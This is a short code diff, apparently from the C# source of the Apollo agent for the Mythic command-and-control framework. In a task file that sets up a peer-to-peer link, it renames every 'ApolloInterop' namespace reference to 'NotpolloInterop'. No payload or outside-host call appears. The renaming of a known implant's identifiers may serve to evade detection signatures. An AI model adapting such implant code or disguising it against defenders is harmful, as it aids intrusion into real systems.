@@ -10,11 +10,11 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using NotpolloInterop.Classes;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
-using ApolloInterop.Serializers;
+using NotpolloInterop.Serializers;
 using System.Threading;
 
 namespace Tasks
@@ -41,7 +41,7 @@ namespace Tasks
         public override void Start()
         {
             TaskResponse resp;
-            ApolloInterop.Classes.P2P.Peer p = null;
+            NotpolloInterop.Classes.P2P.Peer p = null;
             try
             {
                 LinkParameters parameters = _jsonSerializer.Deserialize<LinkParameters>(_data.Parameters);
